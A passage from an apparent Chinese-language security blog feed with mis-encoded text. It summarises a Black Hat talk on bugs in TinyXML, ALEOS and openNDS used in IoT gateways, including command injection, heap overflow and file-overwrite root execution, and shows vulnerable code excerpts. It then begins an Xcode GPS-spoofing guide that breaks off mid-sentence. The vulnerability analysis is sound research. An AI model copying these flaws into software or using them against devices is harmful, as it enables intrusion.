TinyXML</h3><p>TinyXML å·²ç»è¢« TinyXML-2 å–ä»£ï¼Œå‰è€…ä¸å†ç»´æŠ¤ï¼Œæ‰€ä»¥ä½œè€…é€‰æ‹©ç›´æ¥å¯¹ TinyXML è¿›è¡Œ Fuzzã€‚</p><h4 id="2-1-1-CVE-2021-42260-CVE-2023-40458"><a href="#2-1-1-CVE-2021-42260-CVE-2023-40458" class="headerlink" title="2.1.1 CVE-2021-42260 / CVE-2023-40458"></a>2.1.1 CVE-2021-42260 / CVE-2023-40458</h4><p>æŒ‡é’ˆ <code>p</code> æŒ‡å‘æ”»å‡»è€…å¯æ§çš„ XML ä»£ç ï¼Œå¦‚æœ <code>if ( *(p+1) &amp;&amp; *(p+2) )</code> æ£€æŸ¥ä¸è¿‡ï¼Œé‚£ä¹ˆ <code>p</code> ä¼šä¿æŒä¸å˜ï¼Œå¯ä»¥è§¦å‘æ­»å¾ªç¯ï¼Œå®ç° DoS æ”»å‡»ã€‚</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( p &lt; now )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Treat p as unsigned, so we have a happy compiler.</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span>* pU = (<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span>*)p;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Code contributed by Fletcher Dunn: (modified by lee)</span></span><br><span class="line">    <span class="keyword">switch</span> (*pU) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">case</span> TIXML_UTF_LEAD_0:</span><br><span class="line">        <span class="keyword">if</span> ( encoding == TIXML_ENCODING_UTF8 )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( *(p+<span class="number">1</span>) &amp;&amp; *(p+<span class="number">2</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// In these cases, don't advance the column. These are</span></span><br><span class="line">                <span class="comment">// 0-width spaces.</span></span><br><span class="line">                <span class="keyword">if</span> ( *(pU+<span class="number">1</span>)==TIXML_UTF_LEAD_1 &amp;&amp; *(pU+<span class="number">2</span>)==TIXML_UTF_LEAD_2 )</span><br><span class="line">                    p += <span class="number">3</span>; </span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> ( *(pU+<span class="number">1</span>)==<span class="number">0xbf</span>U &amp;&amp; *(pU+<span class="number">2</span>)==<span class="number">0xbe</span>U )</span><br><span class="line">                    p += <span class="number">3</span>; </span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> ( *(pU+<span class="number">1</span>)==<span class="number">0xbf</span>U &amp;&amp; *(pU+<span class="number">2</span>)==<span class="number">0xbf</span>U )</span><br><span class="line">                    p += <span class="number">3</span>; </span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    &#123; p +=<span class="number">3</span>; ++col; &#125;   <span class="comment">// A normal character.</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            ++p;</span><br><span class="line">            ++col;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-1-2-CVE-2023-34194-CVE-2023-40462"><a href="#2-1-2-CVE-2023-34194-CVE-2023-40462" class="headerlink" title="2.1.2 CVE-2023-34194 / CVE-2023-40462"></a>2.1.2 CVE-2023-34194 / CVE-2023-40462</h4><p>è§¦å‘ <code>assert</code> å®ç° DoS æ”»å‡»ã€‚</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span> TiXmlBase::StringEqual( <span class="keyword">const</span> <span class="keyword">char</span>* p,</span><br><span class="line">                             <span class="keyword">const</span> <span class="keyword">char</span>* tag,</span><br><span class="line">                             <span class="keyword">bool</span> ignoreCase,</span><br><span class="line">                             TiXmlEncoding encoding )</span><br><span class="line">&#123;</span><br><span class="line">    assert( p );</span><br><span class="line">    assert( tag );</span><br><span class="line">    <span class="keyword">if</span> ( !p || !*p )</span><br><span class="line">    &#123;</span><br><span class="line">        assert( <span class="number">0</span> );    <span class="comment">// assert</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-ALEOS"><a href="#2-2-ALEOS" class="headerlink" title="2.2 ALEOS"></a>2.2 ALEOS</h3><p>ALEOS å³ AirLink Enterprise Operating Systemï¼Œå¯ä»¥ç†è§£ä¸º IoT è®¾å¤‡çš„å®šåˆ¶ç³»ç»Ÿï¼ŒACEmanager ç­‰éƒ½è¿è¡Œåœ¨è¯¥ç³»ç»Ÿä¸Šã€‚è¿™é‡Œçš„æ¼æ´å®é™…ä¸Šæ˜¯è‡ªç ”ä»£ç çš„æ¼æ´ã€‚</p><h4 id="2-2-1-CVE-2023-40460"><a href="#2-2-1-CVE-2023-40460" class="headerlink" title="2.2.1 CVE-2023-40460"></a>2.2.1 CVE-2023-40460</h4><p>XML ä¸Šä¼  XSS æ¼æ´ï¼š</p><ul><li>å†…å®¹å‡ ä¹æ²¡æœ‰æ ¡éªŒ</li><li>æ‰©å±•åå¯ä»¥ä»»æ„æŒ‡å®š</li><li>é…åˆå¥‡æ€ªçš„è·¯å¾„å¤„ç†é€»è¾‘ï¼Œæœ€ç»ˆå¯ä»¥ä¸Šä¼  HTML å¹¶ä¸”å¯ä»¥é€šè¿‡ URL è®¿é—®</li></ul><p>å‰ææ¡ä»¶ï¼šéœ€è¦å…ˆç™»å½• ACEmanager å†å‘èµ·ä¸Šä¼ æ“ä½œã€‚</p><h4 id="2-2-2-CVE-2018-4063"><a href="#2-2-2-CVE-2018-4063" class="headerlink" title="2.2.2 CVE-2018-4063"></a>2.2.2 CVE-2018-4063</h4><p>è¿™æ˜¯ä½œè€…æåˆ°çš„ Cisco Talos å‘ç°çš„ä¸€ä¸ªæ¼æ´ï¼Œè¿™é‡Œç¬”è€…ç®€å•è¡¥å……ä¸€ä¸‹ï¼Œç»†èŠ‚å¯å‚è€ƒ <a href="https://talosintelligence.com/vulnerability_reports/TALOS-2018-0748" target="_blank" rel="noopener">TALOS-2018-0748</a>ã€‚</p><blockquote><p>When uploading template files, you can specify the name of the file that you are uploading. There are no restrictions in place that protect the files that are currently on the device, used for normal operation. If a file is uploaded with the same name of the file that already exists in the directory, then we inherit the permissions of that file. In this case, the files that exist in the directory that the template file is saved to are:</p><ul><li><code>fw_expected_rm.cgi</code></li><li><code>fw_status.cgi</code></li><li><code>fw_upload_init.cgi</code></li><li><code>fw_upload_init.sh</code></li><li><code>rm_switching_action.cgi</code></li></ul><p>These files all have executable permissions on the device. By uploading a small wrapper, we can upload arbitrary code to the device and run by simply navigating to the web page through the browser. Since ACEManager is running as <code>root</code> any executables run will be running also as <code>root</code>.</p></blockquote><p>å³ä¸Šä¼ åŒåæ–‡ä»¶è¦†ç›–åŸæœ‰æ–‡ä»¶ï¼Œå¯ä»¥ç»§æ‰¿åŸæœ‰æ–‡ä»¶çš„å¯æ‰§è¡Œæƒé™ï¼›è€Œé€šè¿‡æµè§ˆç‰¹å®šçš„ Web é¡µé¢ï¼Œå¯ä»¥è§¦å‘è¿™äº› cgi ä»£ç çš„æ‰§è¡Œï¼›æœ€ç»ˆå®ç° <code>root</code> æƒé™ä»£ç æ‰§è¡Œã€‚å¦å¤–ï¼Œè¿™ä¸ªä¹Ÿéœ€è¦å…ˆç™»å½• ACEmanager æ‰èƒ½å‘èµ·æ”»å‡»ã€‚</p><h3 id="2-3-ç¡¬ç¼–ç é—®é¢˜"><a href="#2-3-ç¡¬ç¼–ç é—®é¢˜" class="headerlink" title="2.3 ç¡¬ç¼–ç é—®é¢˜"></a>2.3 ç¡¬ç¼–ç é—®é¢˜</h3><ol><li>å†…ç½® TLS è¯ä¹¦å’Œç§é’¥ï¼ˆé»˜è®¤ä½¿ç”¨ï¼‰</li><li>è°ƒè¯• Shell root ç”¨æˆ·ç¡¬ç¼–ç å¯†ç  SHA512 å“ˆå¸Œå€¼ï¼ˆåŠŸèƒ½é»˜è®¤ç¦ç”¨ï¼‰</li></ol><h3 id="2-4-openNDS"><a href="#2-4-openNDS" class="headerlink" title="2.4 openNDS"></a>2.4 openNDS</h3><p>openNDSï¼ˆé OpenDNSï¼‰æ˜¯ä¸€ä¸ªå¼€æºçš„ Captive Portal ç»„ä»¶ï¼ˆåŸºäºå¦ä¸€ä¸ªå¼€æºç»„ä»¶ Nodogsplash è¿›è¡Œçš„åˆ†å‰å¼€å‘ï¼‰ï¼Œ<a href="https://opennds.readthedocs.io/en/stable/" target="_blank" rel="noopener">å®˜æ–¹ä»‹ç»</a>å¦‚ä¸‹ï¼š</p><blockquote><p>openNDS (open Network Demarcation Service) is a high performance, small footprint, Captive Portal. It provides a border control gateway between a public local area network and the Internet.</p></blockquote><p>Captive Portal åœ¨æ—¥å¸¸ç”Ÿæ´»ä¸­éå¸¸å¸¸è§ï¼Œæ¯”å¦‚è¿æ¥æœºåœº WiFi æ—¶å‡ºç°çš„è®¤è¯ç³»ç»Ÿï¼Œå°±æ˜¯ç±»ä¼¼ openNDS è¿™æ ·çš„ç»„ä»¶åœ¨å·¥ä½œã€‚</p><p>ä½œè€…åœ¨ç¡®è®¤æ‰€ä¾èµ–çš„ openNDS ç‰ˆæœ¬ä¹‹åï¼Œå»åˆ†æäº†æ­¤ç‰ˆæœ¬å·ä¹‹åæäº¤çš„ commitï¼ˆå› ä¸ºæ²¡æœ‰å…¬å¼€çš„ CVEï¼Œæ‰€ä»¥ç›´æ¥è·Ÿç€ Patch æ¥åˆ†æï¼‰ï¼Œå°è¯•æ ¹æ® commit æ¥å¯»æ‰¾æ¼æ´ï¼ˆæˆ–è€…æ²¡æœ‰è¡¥å®Œçš„åŒç±»æ¼æ´å˜ç§ï¼‰ã€‚</p><h4 id="2-4-1-CVE-2023-38320"><a href="#2-4-1-CVE-2023-38320" class="headerlink" title="2.4.1 CVE-2023-38320"></a>2.4.1 CVE-2023-38320</h4><p>å¦‚æœæ”¶åˆ°çš„ HTTP è¯·æ±‚ä¸å¸¦ User-Agent å­—æ®µï¼Œå¯ä»¥è§¦å‘ç©ºæŒ‡é’ˆå¼•ç”¨å®ç° DoSï¼ˆåœ¨ Patch <a href="https://github.com/openNDS/openNDS/commit/b97bf3566071a8176c6e1add9af9abbfa6d89173" target="_blank" rel="noopener">b97bf35</a> ä¸­å¯ä»¥çœ‹åˆ° <code>do_binauth</code> å¯¹åº”çš„ CVE ä¸º CVE-2023-38322ï¼Œæ­¤å¤–ä½œè€…è¿˜å‘ç°äº†ä¸€äº›å…¶ä»–ç©ºæŒ‡é’ˆå¼•ç”¨é—®é¢˜ï¼Œå¯ä»¥å‚è€ƒ <a href="https://github.com/openNDS/openNDS/releases/tag/v10.1.2" target="_blank" rel="noopener">OpenNDS v10.1.2 release</a>ï¼‰ã€‚</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">show_preauthpage</span><span class="params">(struct MHD_Connection *connection, <span class="keyword">const</span> <span class="keyword">char</span> *query)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    s_config *config = config_get_config();</span><br><span class="line">    <span class="keyword">char</span> *msg;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *user_agent;</span><br><span class="line">    <span class="keyword">char</span> *enc_user_agent;</span><br><span class="line">    <span class="keyword">char</span> *preauthpath;</span><br><span class="line">    <span class="keyword">char</span> *cmd;</span><br><span class="line">    <span class="keyword">char</span> *enc_query;</span><br><span class="line">    <span class="keyword">int</span> rc;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">MHD_Response</span> *<span class="title">response</span>;</span></span><br><span class="line">    preauthpath = safe_calloc(SMALL_BUF);</span><br><span class="line">    safe_asprintf(&amp;preauthpath, <span class="string">"/%s/"</span>, config-&gt;preauthdir);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(preauthpath, config-&gt;fas_path) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">free</span> (preauthpath);</span><br><span class="line">        user_agent = safe_calloc(USER_AGENT);</span><br><span class="line">        enc_user_agent = safe_calloc(ENC_USER_AGENT);</span><br><span class="line"></span><br><span class="line">        MHD_get_connection_values(connection, MHD_HEADER_KIND, get_user_agent_callback, &amp;user_agent);</span><br><span class="line"></span><br><span class="line">        uh_urlencode(enc_user_agent, ENC_USER_AGENT, user_agent, <span class="built_in">strlen</span>(user_agent));  <span class="comment">// strlen(NULL)</span></span><br><span class="line">        <span class="comment">// ......</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-4-2-CVE-2023-38316"><a href="#2-4-2-CVE-2023-38316" class="headerlink" title="2.4.2 CVE-2023-38316"></a>2.4.2 CVE-2023-38316</h4><p>URL <code>unescape</code> å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ã€‚</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">size_t</span> unescape(<span class="keyword">void</span> * cls, struct MHD_Connection *c, <span class="keyword">char</span> *src)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *unescapecmd;</span><br><span class="line">    <span class="keyword">char</span> *msg;</span><br><span class="line"></span><br><span class="line">    debug(LOG_DEBUG, <span class="string">"Escaped string=%s\n"</span>, src);</span><br><span class="line"></span><br><span class="line">    unescapecmd = safe_calloc(QUERYMAXLEN);</span><br><span class="line">    msg = safe_calloc(QUERYMAXLEN);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å‘½ä»¤æ³¨å…¥</span></span><br><span class="line">    <span class="built_in">snprintf</span>(unescapecmd, QUERYMAXLEN, <span class="string">"/usr/lib/opennds/unescape.sh -url \"%s\""</span>, src);</span><br><span class="line">    debug(LOG_DEBUG, <span class="string">"unescapecmd=%s\n"</span>, unescapecmd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (execute_ret_url_encoded(msg, <span class="keyword">sizeof</span>(msg) - <span class="number">1</span>, unescapecmd) == <span class="number">0</span>) &#123;</span><br><span class="line">        debug(LOG_DEBUG, <span class="string">"Unescaped string=%s\n"</span>, msg);</span><br><span class="line">        <span class="built_in">strcpy</span>(src, msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(unescapecmd);</span><br><span class="line">    <span class="built_in">free</span>(msg);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strlen</span>(src);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-4-3-CVE-2023-41101-CVE-2023-40465"><a href="#2-4-3-CVE-2023-41101-CVE-2023-40465" class="headerlink" title="2.4.3 CVE-2023-41101 / CVE-2023-40465"></a>2.4.3 CVE-2023-41101 / CVE-2023-40465</h4><p><code>preauthenticated</code> å­˜åœ¨ Query String è§£æå †æº¢å‡ºæ¼æ´ï¼ˆè€ç‰ˆæœ¬æ˜¯æ ˆæº¢å‡ºæ¼æ´ï¼‰ã€‚</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">preauthenticated</span><span class="params">(struct MHD_Connection *connection, <span class="keyword">const</span> <span class="keyword">char</span> *url, t_client *client)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    s_config *config = config_get_config();</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *host = config-&gt;gw_address;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *accept = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *redirect_url;</span><br><span class="line">    <span class="keyword">char</span> *query;</span><br><span class="line">    <span class="keyword">char</span> *querystr;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check for preauthdir</span></span><br><span class="line">    <span class="keyword">if</span> (check_authdir_match(url, config-&gt;preauthdir)) &#123;</span><br><span class="line"></span><br><span class="line">        debug(LOG_DEBUG, <span class="string">"preauthdir url detected: %s"</span>, url);</span><br><span class="line">        query = safe_calloc(QUERYMAXLEN);    <span class="comment">// #define QUERYMAXLEN 8192</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!query) &#123;</span><br><span class="line">            ret = send_error(connection, <span class="number">503</span>);</span><br><span class="line">            <span class="built_in">free</span>(query);</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        get_query(connection, &amp;query, QUERYSEPARATOR);  <span class="comment">// Heap Buffer Overflow</span></span><br><span class="line">        debug(LOG_DEBUG, <span class="string">"preauthenticated: show_preauthpage [%s]"</span>, query);</span><br><span class="line">        ret = show_preauthpage(connection, query);</span><br><span class="line">        <span class="built_in">free</span>(query);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// save the query or empty string into **query.</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">get_query</span><span class="params">(struct MHD_Connection *connection, <span class="keyword">char</span> **query, <span class="keyword">const</span> <span class="keyword">char</span> *separator)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> element_counter;</span><br><span class="line">    <span class="keyword">char</span> **elements;</span><br><span class="line">    <span class="keyword">char</span> *query_str;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">collect_query</span> <span class="title">collect_query</span>;</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    <span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">    <span class="comment">// length çš„é•¿åº¦ä¾èµ–äº URL Query String å†…å®¹</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; element_counter; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!elements[i])</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        length += <span class="built_in">strlen</span>(elements[i]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">0</span>) <span class="comment">// q=foo&amp;o=bar the '&amp;' need also some space</span></span><br><span class="line">            length++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; element_counter; i++) &#123;</span><br><span class="line">        <span class="comment">// ......</span></span><br><span class="line">        <span class="built_in">strncpy</span>(*query + j, elements[i], length - j);  <span class="comment">// Heap Buffer Overflow</span></span><br><span class="line">        <span class="comment">// ......</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-4-4-Root"><a href="#2-4-4-Root" class="headerlink" title="2.4.4 Root"></a>2.4.4 Root</h4><p>ä½œè€…åˆ©ç”¨å‰é¢çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œé…åˆä¸€äº›å…¶ä»–æ¼æ´å®ç°äº†è®¾å¤‡ Rootã€‚</p><h2 id="0x03-HoneyPot"><a href="#0x03-HoneyPot" class="headerlink" title="0x03. HoneyPot"></a>0x03. HoneyPot</h2><p>æœ€åï¼Œä½œè€…æ­å»ºèœœç½æ”¶é›†äº†ä¸€æ³¢æ”»å‡»æ•°æ®ï¼šåœ¨å„ç§å„æ ·çš„æ”»å‡»æ•°æ®ä¸­å‘ç°äº†é’ˆå¯¹ Sierra Wireless AirLink Gateways çš„æ”»å‡»ï¼Œä½†æ˜¯æ˜¯ç›´æ¥ä½¿ç”¨çš„ Cisco Talos å…¬å¸ƒçš„ PoCï¼Œå¹¶æ²¡æœ‰ä½¿ç”¨ 0day æˆ–å…¶ä»–æœªçŸ¥æ¼æ´ã€‚</p><h2 id="0x04-å°ç»“"><a href="#0x04-å°ç»“" class="headerlink" title="0x04. å°ç»“"></a>0x04. å°ç»“</h2><p>é¦–å…ˆæ˜¯å­¦ä¹ ä½œè€…çš„ç ”ç©¶æ€è·¯ï¼Œå…¶æ¬¡æ˜¯äº†è§£ä¸€äº›å¸¸è§çš„æ¼æ´æ¨¡å¼ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://www.blackhat.com/eu-23/briefings/schedule/index.html#old-code-dies-hard-finding-new-vulnerabilities-in-old-third-party-software-components-and-the-importance-of-having-sbom-for-iotot-devices-35349&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;strong&gt;Old code dies hard:&lt;/strong&gt; Finding new vulnerabilities in old third-party software components and the importance of having SBoM for IoT/OT devices&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Conferences" scheme="https://programlife.net/categories/Conferences/"/>
    
      <category term="BlackHat" scheme="https://programlife.net/categories/Conferences/BlackHat/"/>
    
    
      <category term="IoT" scheme="https://programlife.net/tags/IoT/"/>
    
      <category term="TinyXML" scheme="https://programlife.net/tags/TinyXML/"/>
    
      <category term="Captive Portal" scheme="https://programlife.net/tags/Captive-Portal/"/>
    
      <category term="openNDS" scheme="https://programlife.net/tags/openNDS/"/>
    
  </entry>
  
  <entry>
    <title>iOS è®¾å¤‡ GPS ä½ç½®æ¨¡æ‹Ÿ</title>
    <link href="https://programlife.net/2021/05/30/ios-device-gps-location-emulation/"/>
    <id>https://programlife.net/2021/05/30/ios-device-gps-location-emulation/</id>
    <published>2021-05-30T13:33:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>æœªè¶Šç‹± iOS è®¾å¤‡é€šè¿‡ Xcode ä¿®æ”¹ GPS å®šä½ä¿¡æ¯ã€‚</p><a id="more"></a><h2 id="0x01-GPS-åæ ‡ç®€ä»‹"><a href="#0x01-GPS-åæ ‡ç®€ä»‹" class="headerlink" title="0x01. GPS åæ ‡ç®€ä»‹"></a>0x01. GPS åæ ‡ç®€ä»‹</h2><p>GPS åæ ‡ä½¿ç”¨ç»çº¬åº¦æ¥è¡¨ç¤ºï¼Œæœ‰å‡ ç§ä¸åŒçš„è§„èŒƒï¼š</p><ol><li>WGS-84ï¼ŒWorld Geodetic Systemï¼Œå®šä¹‰äº 1984 å¹´ï¼Œæœ€åä¿®æ”¹å®šäº 2004 å¹´ï¼Œæ˜¯è¢« GPS æ‰€ä½¿ç”¨çš„å›½é™…è§„èŒƒ</li><li>GCJ-02ï¼Œå›½æµ‹å±€åæ ‡ç³»ã€ç«æ˜Ÿåæ ‡ç³»ï¼ŒåŸºäº WGS-84 ä½†æ˜¯ä¼šåœ¨ç»çº¬åº¦ä¸­åŠ å…¥çœ‹ä¼¼éšæœºçš„åç§»</li><li>BD-09ï¼Œç™¾åº¦åæ ‡ç³»ï¼Œåœ¨ GCJ-02 çš„åŸºç¡€ä¸Šå¢åŠ äº†ä¸€æ¬¡å˜æ¢</li></ol><p>ã€Šä¸­åäººæ°‘å…±å’Œå›½æµ‹ç»˜æ³•ã€‹è¦æ±‚åœ°å›¾æä¾›å•†ä½¿ç”¨ GCJ-02 åæ ‡ç³»ç»Ÿï¼š</p><blockquote><p>ä½¿ç”¨ GCJ-02 è®°å½•ä¸‹çš„åœ°ç‚¹åœ¨ GCJ-02 çš„åœ°å›¾ä¸­ä¼šæ˜¾ç¤ºåœ¨æ­£ç¡®ä½ç½®ï¼Œç„¶è€Œæ¢æˆ WGS-84 çš„åœ°å›¾æˆ–åœ°ç‚¹è®°å½•å°±å¯èƒ½é€ æˆ 100 - 700 ç±³ä¸ç­‰çš„åç§»ã€‚æ®æµ‹é‡ï¼ŒGoogle.com çš„åœ°å›¾ä¸çœŸå®åæ ‡ç›¸å·®çº¦ 50 - 500 ç±³ï¼Œè€Œä¸­å›½åŒºçš„ Google.cn åœ°å›¾åˆ™ä¸å«æ˜Ÿå›¾æ— åå·®</p></blockquote><p>å®é™…æµ‹è¯•å‘ç° Google.cn è¿ç§»åˆ° Google.com.hk ä¹‹åï¼Œä½¿ç”¨çš„æ˜¯ WGS-84 åæ ‡ç³»ï¼Œå…¶å«æ˜Ÿå›¾ä¸åœ°å›¾å­˜åœ¨ä¸€å®šçš„åç§»ï¼š</p><p><img src="/uploads/202105/google-maps.jpg" alt="ç«æ˜Ÿåæ ‡ç³»åç§»"></p><h2 id="0x02-Xcode-çœŸæœºè°ƒè¯•"><a href="#0x02-Xcode-çœŸæœºè°ƒè¯•" class="headerlink" title="0x02. Xcode çœŸæœºè°ƒè¯•"></a>0x02. Xcode çœŸæœºè°ƒè¯•</h2><p>åœ¨ Xcode ä¸­æ–°å»ºä¸€ä¸ª iOS Appï¼Œå¹¶åœ¨ iOS Deployment Target è®¾ç½®å¥½å¯¹åº”çš„ç³»ç»Ÿç‰ˆæœ¬ã€‚</p><p><img src="/uploads/202105/ios-deployment-target.jpg" alt="iOS Deployment Target è®¾ç½®"></p><p>é¦–æ¬¡åœ¨ iPhone ä¸Šè°ƒè¯•ï¼Œä¼šæç¤ºå¦‚ä¸‹é”™è¯¯ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Could not launch â€œPhoneDemoâ€</span><br><span class="line">Domain: IDEDebugSessionErrorDomain</span><br><span class="line">Code: 3</span><br><span class="line">Failure Reason: Security</span><br><span class="line">User Info: &#123;</span><br><span class="line">    DVTRadarComponentKey = 855031;</span><br><span class="line">    RawUnderlyingErrorMessage = Security;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/uploads/202105/ide-debug-session-error-domain-security.jpg" alt="DVTRadarComponentKey=855031 RawUnderlyingErrorMessage=Security"></p><p>åœ¨ iPhone çš„è®¾ç½®é‡Œé¢ä¿¡ä»»å¯¹åº”çš„å¼€å‘è€…å³å¯ã€‚</p><h2 id="0x03-GPS-ä½ç½®æ¨¡æ‹Ÿ"><a href="#0x03-GPS-ä½ç½®æ¨¡æ‹Ÿ" class="headerlink" title="0x03. GPS ä½ç½®æ¨¡æ‹Ÿ"></a>0x03. GPS ä½ç½®æ¨¡æ‹Ÿ</h2><ol><li>é€šè¿‡ <a href="https://lbs.amap.com/tools/picker" target="_blank" rel="noopener">é«˜å¾·åœ°å›¾ API</a> è·å–ç›®æ ‡ä½ç½®çš„ GCJ-02 åæ ‡ï¼Œæ¯”å¦‚â€œæ·±åœ³å¸‚è…¾è®¯å¤§å¦â€çš„åæ ‡ä¸º <code>113.934497,22.540517</code></li><li>é€šè¿‡ <a href="http://www.dituwa.com/tool/gpxaxes" target="_blank" rel="noopener">è½¬æ¢å·¥å…·</a> å°†åæ ‡è½¬æ¢ä¸º WGS-84 åæ ‡ï¼Œè¿™é‡Œè½¬æ¢åä¸º <code>113.92962958,22.54354674</code></li><li>åœ¨ iOS App å·¥ç¨‹ä¸­æ–°å»ºä¸€ä¸ª location.gpx æ–‡ä»¶å¹¶è®¾ç½®å¥½ WGS-84 ç»çº¬åº¦åæ ‡</li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;gpx version=&quot;1.1&quot;</span><br><span class="line">    creator=&quot;GMapToGPX 6.4j - http://www.elsewhere.org/GMapToGPX/&quot;</span><br><span class="line">    xmlns=&quot;http://www.topografix.com/GPX/1/1&quot;</span><br><span class="line">    xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">    xsi:schemaLocation=&quot;http://www.topografix.com/GPX/1/1 http://www.topografix.com/GPX/1/1/gpx.xsd&quot;&gt;</span><br><span class="line">    &lt;wpt lat=&quot;22.54354674&quot; lon=&quot;113.92962958&quot;&gt;</span><br><span class="line">    &lt;/wpt&gt;</span><br><span class="line">&lt;/gpx&gt;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œéœ€è¦ä¿®æ”¹ iOS App å·¥ç¨‹è®¾ç½®ï¼Œé€‰æ‹© <code>Edit Scheme...</code>ï¼Œåœ¨ Run - Options - Core Location ä¸­é€‰ä¸­ Allow Location Simulationï¼Œå…¶ä¸­ Default Location é€‰ä¸­å‰é¢æ·»åŠ çš„ gpx æ–‡ä»¶ã€‚</p><p><img src="/uploads/202105/ios-location-simulation.jpg" alt=""></p><p>åœ¨è¿æ¥çš„ iPhone ä¸Šè¿è¡Œè¯¥ iOS Appï¼Œå³å¯ä¸´æ—¶ä¿®æ”¹ GPS ä½ç½®ä¿¡æ¯ã€‚</p><p><img src="/uploads/202105/shenzhen-tencent-building.jpg" alt="æ·±åœ³å¸‚è…¾è®¯å¤§å¦"></p><p>å½“ç„¶ï¼Œè¿™ç§æ¨¡æ‹Ÿ GPS 